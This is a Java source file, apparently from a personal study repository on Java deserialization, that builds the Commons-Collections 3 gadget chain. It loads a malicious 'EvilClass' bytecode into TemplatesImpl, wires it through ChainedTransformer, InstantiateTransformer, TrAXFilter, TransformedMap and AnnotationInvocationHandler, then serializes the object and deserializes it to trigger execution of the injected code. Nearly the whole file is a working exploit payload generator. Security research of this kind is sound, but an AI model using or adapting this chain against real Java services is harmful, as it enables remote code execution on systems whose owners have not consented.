package FastJson1224VULN.TemplatesImplBasedATTACK;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static void main(String[] args) throws Exception {
        byte[] evil = Files.readAllBytes(Paths.get("/home/n0zom1z0/Desktop/Java-Sec/Deserialization/CC3again/target/classes/assets/EvilClass.class"));
        byte[][] _bytecodes = {evil};

        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "notnull");

        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, _bytecodes);

        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());

//        templates.newTransformer();
//        TrAXFilter trAXFilter = new TrAXFilter(templates);
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(
                new Class[]{Templates.class},new Object[]{templates}
        );
//        instantiateTransformer.transform(TrAXFilter.class);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> hashMap =new HashMap<>();
        hashMap.put("value","nonsense"); // ensure Map.Entry entry not empty
        Map<Object,Object> decoratedMap = (TransformedMap) TransformedMap.decorate(
                hashMap,null, chainedTransformer
        );

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor aihConstructor = c.getDeclaredConstructor(Class.class,Map.class);
        aihConstructor.setAccessible(true);
        Object o = aihConstructor.newInstance(Target.class,decoratedMap);

        serialize(o);
        deserialize("ser.bin");
    }
    public static void serialize(Object o) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(o);
    }
    public static Object deserialize(String fileName) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        return ois.readObject();
    }
}
